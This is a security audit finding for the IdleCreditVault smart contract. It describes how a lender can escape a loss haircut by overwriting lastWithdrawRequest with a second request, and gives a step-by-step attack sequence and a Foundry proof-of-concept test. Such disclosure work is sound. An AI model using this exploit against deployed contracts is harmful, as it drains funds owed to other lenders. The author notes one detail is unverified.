### Title
Attacker escapes `stopEpochWithDuration` loss haircut by overwriting `lastWithdrawRequest` before claiming - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The loss-adjusted claim path `_claimLossAdjustedWithdrawRequest` locates a user's loss-epoch receipt by a single mutable marker, `lastWithdrawRequest[_user]`, and looks up the haircut in `lossRecoveryPriceByEpoch[lossEpoch]`. `requestWithdraw` overwrites `lastWithdrawRequest[_user]` unconditionally on every new request. A lender whose epoch-E1 receipt was haircut can simply place a new withdraw request in epoch E2, wait one epoch, and claim — the loss-adjusted path now indexes epoch E2 (no haircut recorded, returns early) and `_claimFundedWithdrawRequest` pays the still-populated `withdrawsRequests[_user]` aggregate, which includes the E1 receipt, at par. This is the vault analog of the reference bug: an attacker-controlled key (`lastWithdrawRequest` as the epoch index) is written into a privileged slot without validation, and a downstream consumer silently treats an unvalidated lookup as authoritative.

### Finding Description
In `requestWithdraw`, after burning the CDO's principal and minting the user a receipt, the strategy records `lastWithdrawRequest[_user] = currentEpoch` with no check for an outstanding prior receipt [1](#0-0) .

When a running epoch is stopped with a loss (`stopEpochWithDuration(_lossAmount)`), the strategy stores a per-epoch recovery ratio in `lossRecoveryPriceByEpoch[epoch]` and the borrower funds only the haircut-adjusted amount. The corresponding user receipts, however, remain recorded in `withdrawsRequests[_user]` and `withdrawsRequestsByEpoch[_user][E1]` — `_claimLossAdjustedWithdrawRequest` itself proves this, since it clears them via `_clearWithdrawClaimForEpoch` only at claim time [2](#0-1) .

The claim path:

```solidity
// contracts/strategies/idle/IdleCreditVault.sol
function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];               // attacker-controlled key
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;                     // silent early-return
    ...
}
amount += _claimLossAdjustedWithdrawRequest(_user);
return amount + _claimFundedWithdrawRequest(_user);                // pays aggregate at par
```

Once `lastWithdrawRequest` points to a non-loss epoch, the loss path early-returns, and `_claimFundedWithdrawRequest` pays `normalAmount = withdrawsRequests[_user]` — the full unhaircut basis — gated only by `epochNumber > lastWithdrawRequest[_user]` [3](#0-2) .

Attack sequence (running epoch, fixed-APR or APR0 mode, non-prefunded):

1. Epoch E1 running. Attacker (KYC'd lender) calls `cdoEpoch.requestWithdraw(amount, tranche)` → receipt minted, `withdrawsRequestsByEpoch[attacker][E1] += amt`, `lastWithdrawRequest[attacker] = E1`.
2. Borrower repays short by `_lossAmount`; `stopEpochWithDuration(_lossAmount)` records `lossRecoveryPriceByEpoch[E1] < RECOVERY_FULL` and funds only `amt * price / FULL`.
3. Epoch E2: attacker calls `requestWithdraw` with a minimal amount (e.g., 1 wei of tranche). `lastWithdrawRequest[attacker] = E2`. The E1 receipt remains in `withdrawsRequests`/`withdrawsRequestsByEpoch`.
4. Epoch E2 stops normally; `epochNumber > E2` so the funded-claim guard passes.
5. `claimWithdrawRequest`: `lossRecoveryPriceByEpoch[E2] == 0` → loss path skipped; funded path transfers `withdrawsRequests[attacker]` = full E1 basis + E2 receipt at par.

The E1 haircut the borrower never funded is paid out of strategy-held underlyings.

### Impact Explanation
Direct theft and insolvency: the attacker recovers `claimBasis_E1 * (1 - lossRecoveryPriceByEpoch[E1] / RECOVERY_FULL)` that was explicitly not funded by the borrower. Since the strategy only received the loss-adjusted amount for E1, the overpayment is drawn from underlyings backing other users' funded receipts and active tranche NAV — subsequent claimants revert or are shortchanged. Broken invariant: loss socialization / one-receipt-one-payout — a haircut receipt must never settle at par.

### Likelihood Explanation
The trigger requires only ordinary user actions: holding a tranche receipt during a loss epoch and placing a second withdraw request — both unprivileged operations available to any KYC-passed lender. No privileged cooperation is needed; `stopEpochWithDuration` with a loss is a designed code path for impaired repayment, and borrower under-repayment is a normal credit event. No existing guard blocks it: the `epochNumber <= lastWithdrawRequest` check is designed to delay claims, not to validate epoch identity, and it passes once the new epoch ends.

One caveat I could not fully verify within the search context: the exact write site of `lossRecoveryPriceByEpoch` inside the stop-epoch flow (the grep returned matches in `IdleCDOEpochVariant.sol`/`IdleCreditVault.sol` but I did not get the surrounding lines). The vulnerability logic does not depend on that detail — it only requires that the map is keyed by the request epoch and that receipts persist in `withdrawsRequests`, both confirmed by `_clearWithdrawClaimForEpoch` [4](#0-3) .

### Recommendation
Do not derive the loss-claim epoch from the mutable `lastWithdrawRequest` marker. Iterate or track the set of epochs with unclaimed receipts per user (e.g., check `lossRecoveryPriceByEpoch[e] != 0` for every epoch with nonzero `withdrawsRequestsByEpoch[_user][e]`), or record a per-user/per-epoch loss flag at loss time. At minimum, `_claimFundedWithdrawRequest` should exclude any epoch whose `lossRecoveryPriceByEpoch` is nonzero, so a haircut receipt can never settle through the par path.

### Proof of Concept
Foundry fork test (same harness style as `test/foundry/IdleCreditVault.t.sol`):

```solidity
function testLossHaircutBypassedBySecondRequest() external {
    uint256 amount = 10000 * ONE_SCALE;
    idleCDO.depositAA(amount);
    _transferBurnedTrancheTokens(address(this), true);
    _startEpochAndCheckPrices(0);          // epoch E0->E1 boundary

    // E1: request withdraw
    uint256 req1 = cdoEpoch.requestWithdraw(trancheBal / 2, address(AAtranche));
    uint256 lossEpoch = strategy.epochNumber();

    // borrower repays short: stopEpochWithDuration with loss
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 owed = cdoEpoch.expectedEpochInterest() + strategy.pendingWithdraws();
    uint256 loss = req1 / 2;               // 50% of the receipt unfunded
    deal(defaultUnderlying, borrower, owed - loss);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, loss); // sets lossRecoveryPriceByEpoch[E1]

    // E2: tiny second request overwrites lastWithdrawRequest
    _startEpochAndCheckPrices(1);
    uint256 req2 = cdoEpoch.requestWithdraw(1, address(AAtranche));
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest() + strategy.pendingWithdraws());
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // claim: pays req1 at PAR instead of haircut price
    uint256 balPre = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 got = underlying.balanceOf(address(this)) - balPre;

    uint256 haircutPrice = strategy.lossRecoveryPriceByEpoch(lossEpoch);
    uint256 correct = req1 * haircutPrice / 1e18 + req2;
    assertGt(got, correct, "attacker escaped the loss haircut");
    assertEq(got, req1 + req2, "paid at par");
}
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }

  /// @notice Clear a normal/APR0 withdraw receipt for one request epoch.
  /// @dev This does not move funds or burn receipt tokens. Default claims also decrease
  /// `apr0TotalPrincipal`; loss-adjusted claims do not because stopEpoch already closed that bucket.
  /// @param _user address of the user
  /// @param _claimEpoch epoch whose receipt should be cleared
  /// @param _isClearingApr0 true when clearing an open APR0 default claim
  /// @return claimBasis claim amount before applying the recovery ratio
  /// @return burnAmount strategy-token receipt amount to burn
  function _clearWithdrawClaimForEpoch(address _user, uint256 _claimEpoch, bool _isClearingApr0) internal returns (uint256 claimBasis, uint256 burnAmount) {
    (claimBasis, burnAmount) = _withdrawClaimAmountsForEpoch(_user, _claimEpoch);
    if (claimBasis == 0) return (claimBasis, burnAmount);

    uint256 normalAmount = withdrawsRequestsByEpoch[_user][_claimEpoch];
    if (normalAmount != 0) {
      withdrawsRequestsByEpoch[_user][_claimEpoch] = 0;
      // The aggregate may also include older funded receipts; clear only this epoch's piece.
      withdrawsRequests[_user] -= normalAmount;
    }
    Apr0UserData storage apr0User = apr0Users[_user];
    if (apr0User.principal != 0 && apr0User.principalEpoch == _claimEpoch) {
      if (_isClearingApr0) {
        uint256 apr0Principal = apr0User.principal;
        uint256 totalApr0Principal = apr0TotalPrincipal;
        // prepareStopEpochWithApr0 may already close the global APR0 bucket before default finalization.
        apr0TotalPrincipal = apr0Principal >= totalApr0Principal ? 0 : totalApr0Principal - apr0Principal;
      }
      apr0User.principal = 0;
      apr0User.principalEpoch = 0;
    }
    if (lastWithdrawRequest[_user] == _claimEpoch) {
      // The cleared epoch was the latest request marker. Any remaining normal/APR0 receipt
      // is older and already funded, so it can continue to the funded-claim path.
      lastWithdrawRequest[_user] = 0;
    }
```
